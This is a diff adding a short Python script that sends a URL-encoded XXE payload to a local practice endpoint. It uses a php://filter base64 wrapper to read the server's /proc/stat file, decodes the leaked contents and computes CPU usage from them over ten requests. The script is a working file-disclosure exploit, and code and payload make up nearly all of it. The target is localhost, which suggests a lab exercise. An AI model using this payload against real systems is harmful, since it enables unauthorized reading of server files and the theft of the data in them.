@@ -1,0 +1,22 @@
+import requests
+import base64
+
+url = 'http://localhost/xml/example1.php?xml='
+xml2 = """%3C!DOCTYPE%20test%20[%3C!ENTITY%20file%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=/proc/stat%22%3E]%3E%3Ctest%3Eaaaa\n%26file%3Bbbbb\n%3C/test%3E"""
+url += xml2
+i = 0
+last_busy = 0
+last_work = 0
+for i in range(10):
+    r = requests.get(url) 
+    tex = r.text
+    start = tex.rfind('aaaa')
+    stop = tex.find('bbbb')
+    ras = base64.b64decode(tex[start+4:stop]).decode('ascii').split('\n')
+    cpu = ras[0].split()
+    busy = int(cpu[1])+int(cpu[2])+int(cpu[3])
+    work = busy + int(cpu[4])
+    usege = 100 * (busy - last_busy)/(work - last_work)
+    print("usege:", usege)
+    last_busy = busy
+    last_work = work
